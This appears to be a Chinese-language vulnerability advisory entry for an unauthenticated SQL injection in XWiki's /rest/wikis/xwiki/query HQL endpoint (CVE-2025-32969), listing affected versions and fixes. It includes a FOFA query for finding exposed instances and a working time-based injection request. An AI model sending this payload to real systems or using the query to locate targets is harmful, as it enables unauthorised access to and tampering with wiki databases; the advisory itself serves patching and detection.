## XWiki SQL注入漏洞（CVE-2025-32969）

## 漏洞描述
XWiki 在 15.10.16、16.4.6、16.10.1 之前的版本中，`/rest/wikis/xwiki/query` HQL API 未正确限制上下文跳出，远程未登录用户可通过构造的 HQL 语句注入任意 SQL，进而获取机密数据或执行更新/删除操作。

## 影响版本
- XWiki ≥1.8 且 <15.10.16
- XWiki <16.4.6
- XWiki <16.10.1

## 资产测绘
```
fofa: body="data-xwiki-reference"
```

## POC
```
GET /rest/wikis/xwiki/query?q=where%20doc.name=length(%27a%27)*org.apache.logging.log4j.util.Chars.SPACE%20or%20%271%3C%27%271%5C%27%27%27%20union%20select%201,2,3,sleep(5)%20%23&type=hql&distinct=0 HTTP/1.1
Host: <target>
User-Agent: Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Accept: */*
```
请求被处理时数据库会延迟 5 秒，表明 SQL 注入成功。

## 修复建议
- 升级到 15.10.16 / 16.4.6 / 16.10.1 或以上版本
- 临时可禁用 REST HQL 接口或增加鉴权

